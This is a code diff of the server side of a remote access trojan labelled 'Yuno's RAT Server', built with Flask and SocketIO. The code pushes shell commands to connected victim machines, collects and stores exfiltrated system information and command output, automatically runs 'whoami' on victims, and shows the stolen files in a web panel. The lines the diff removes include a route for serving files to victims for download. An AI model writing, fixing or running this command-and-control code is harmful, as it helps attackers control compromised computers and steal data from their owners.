@@ -2,30 +2,36 @@
 import os
 import json
 import datetime
-from flask import Flask, render_template, request, send_from_directory, jsonify
+from flask import Flask, render_template, request, send_from_directory
 from flask_socketio import SocketIO, emit
+from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret!'
 app.config['UPLOAD_FOLDER'] = 'uploads'
-app.config['DOWNLOAD_FOLDER'] = 'downloads'
 socketio = SocketIO(app, cors_allowed_origins="*")
 
-# Ensure directories exist
-for folder in [app.config['UPLOAD_FOLDER'], app.config['DOWNLOAD_FOLDER']]:
-    if not os.path.exists(folder):
-        os.makedirs(folder)
+# Ensure upload directory exists
+if not os.path.exists(app.config['UPLOAD_FOLDER']):
+    os.makedirs(app.config['UPLOAD_FOLDER'])
 
-# In-memory storage
+# Track connected clients
 connected_clients = set()
+
+# Store client info
 client_info = {}
-command_outputs = []
-exfiltrated_files = []
+
+def get_files():
+    """List all files in the upload folder."""
+    upload_folder = app.config['UPLOAD_FOLDER']
+    files = [f for f in os.listdir(upload_folder) if os.path.isfile(os.path.join(upload_folder, f))]
+    return sorted(files)
 
 @app.route('/')
 def index():
-    """Render the main page with connected clients and exfiltrated files."""
-    return render_template('index.html', clients=list(connected_clients), files=[f['filename'] for f in exfiltrated_files])
+    """Render the main page with connected clients and uploaded files."""
+    files = get_files()
+    return render_template('index.html', clients=list(connected_clients), files=files)
 
 @app.route('/send_command', methods=['POST'])
 def send_command():
@@ -34,30 +40,24 @@ def send_command():
     command = request.form.get('command')
 
     if not client_id or not command:
-        return jsonify({"status": "error", "message": "Missing client_id or command"}), 400
+        return {"status": "error", "message": "Missing client_id or command"}, 400
 
-    print(f"[*] Sending command '{command}' to {client_id}")
+    # Emit command to the specified client
     socketio.emit('command', command, to=client_id)
-    return jsonify({"status": "success", "message": f"Command '{command}' sent to {client_id}"})
 
-@app.route('/upload_file', methods=['POST'])
-def upload_file():
-    """Handle file uploads for downloading to victims."""
-    if 'file' not in request.files:
-        return jsonify({"status": "error", "message": "No file part"}), 400
-    file = request.files['file']
-    if file.filename == '':
-        return jsonify({"status": "error", "message": "No selected file"}), 400
-    if file:
-        filename = os.path.basename(file.filename)  # Simplified to avoid secure_filename import issue
-        file_path = os.path.join(app.config['DOWNLOAD_FOLDER'], filename)
-        file.save(file_path)
-        return jsonify({"status": "success", "filename": filename})
+    return {"status": "success", "message": f"Command '{command}' sent to {client_id}"}
 
-@app.route('/download/<filename>')
-def download(filename):
-    """Serve files for clients to download."""
-    return send_from_directory(app.config['DOWNLOAD_FOLDER'], filename)
+@app.route('/view_file/<filename>')
+def view_file(filename):
+    """Render a page to view the contents of an uploaded file."""
+    filename = secure_filename(filename)
+    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+    if os.path.exists(file_path):
+        with open(file_path, 'r', encoding='utf-8', errors='replace') as f:
+            content = f.read()
+        return render_template('view_file.html', filename=filename, file_content=content)
+    else:
+        return "File not found", 404
 
 @socketio.on('connect')
 def handle_connect():
@@ -66,7 +66,6 @@ def handle_connect():
     connected_clients.add(client_id)
     print(f"[*] Client connected: {client_id}")
     emit('client_update', list(connected_clients), broadcast=True)
-    emit('request_client_info', broadcast=True)
 
 @socketio.on('disconnect')
 def handle_disconnect():
@@ -77,54 +76,67 @@ def handle_disconnect():
         client_info.pop(client_id, None)
         print(f"[*] Client disconnected: {client_id}")
         emit('client_update', list(connected_clients), broadcast=True)
-        emit('request_client_info', broadcast=True)
 
 @socketio.on('exfil_data')
-def handle_exfil_data(sid, data):
+def handle_exfil_data(data):
     """Handle exfiltrated data from clients."""
     client_id = request.sid
-    print(f"[DEBUG] Exfil_data received - sid: {sid}, data: {data}")
-    try:
-        parsed_data = json.loads(data) if isinstance(data, str) else data
-        print(f"[DEBUG] Parsed data: {parsed_data}")
-    except json.JSONDecodeError as e:
-        print(f"[!] JSON decode error for {client_id}: {e}")
-        return
-
-    data_type = parsed_data.get('type')
-    timestamp = datetime.datetime.now()
+    data = json.loads(data)
+    data_type = data.get('type')
 
     if data_type == "system_info":
-        client_info[client_id] = parsed_data.get('system', {})
-        filename = f"{client_id}_{timestamp.strftime('%Y%m%d_%H%M%S')}_sysinfo.json"
-        content = json.dumps(parsed_data, indent=4)
-        exfiltrated_files.append({'client_id': client_id, 'filename': filename, 'content': content, 'timestamp': timestamp})
-        print(f"[*] Exfiltrated system info stored: {filename}")
-        emit('exfil_data', json.dumps({"type": "system_info", "filename": filename}), broadcast=True)
+        # Store client info
+        username = data.get('system', {}).get('username', None)
+        if not username:
+            # Request username via whoami
+            socketio.emit('command', 'whoami', to=client_id)
+        else:
+            client_info[client_id] = data.get('system', {})
+            client_info[client_id]['username'] = username
+        # Save system info to a file
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"{client_id}_{timestamp}_sysinfo.json"
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        with open(filepath, 'w', encoding='utf-8') as f:
+            json.dump(data, f, indent=4)
+        print(f"[*] Exfiltrated data saved: {filepath}")
 
     elif data_type == "command_output":
-        command = parsed_data.get('command', 'unknown')
-        output = parsed_data.get('output', '')
-        current_dir = parsed_data.get('current_dir', 'unknown')
-        command_outputs.append({'client_id': client_id, 'command': command, 'output': output, 'current_dir': current_dir, 'timestamp': timestamp})
-        print(f"[*] Command output received: {command} -> {output}")
+        command = data.get('command', 'unknown')
+        output = data.get('output', '')
+        current_dir = data.get('current_dir', 'unknown')
+
+        # Check if the command was whoami to update username
+        if command.strip().lower() == 'whoami':
+            username = output.strip()
+            if client_id not in client_info:
+                client_info[client_id] = {}
+            client_info[client_id]['username'] = username
+
+        # Emit command output to web interface
         emit('command_output', {
-            'timestamp': timestamp.strftime("%Y-%m-%d %H:%M:%S"),
+            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
             'client_id': client_id,
             'command': command,
             'output': output,
             'current_dir': current_dir
         }, broadcast=True)
 
-    client_info_list = [{'id': cid, 'system': info} for cid, info in client_info.items()]
+    # Emit updated client info to web interface
+    client_info_list = [
+        {'id': cid, 'system': info}
+        for cid, info in client_info.items()
+    ]
     emit('client_info', client_info_list, broadcast=True)
 
 @socketio.on('request_client_info')
-def handle_request_client_info(sid):
+def handle_request_client_info():
     """Handle requests for client info from the web interface."""
-    print(f"[DEBUG] Request_client_info received - sid: {sid}")
-    client_info_list = [{'id': cid, 'system': info} for cid, info in client_info.items()]
-    emit('client_info', client_info_list, broadcast=True)
+    client_info_list = [
+        {'id': cid, 'system': info}
+        for cid, info in client_info.items()
+    ]
+    emit('client_info', client_info_list)
 
 if __name__ == "__main__":
     print("=== Yuno's RAT Server ===")
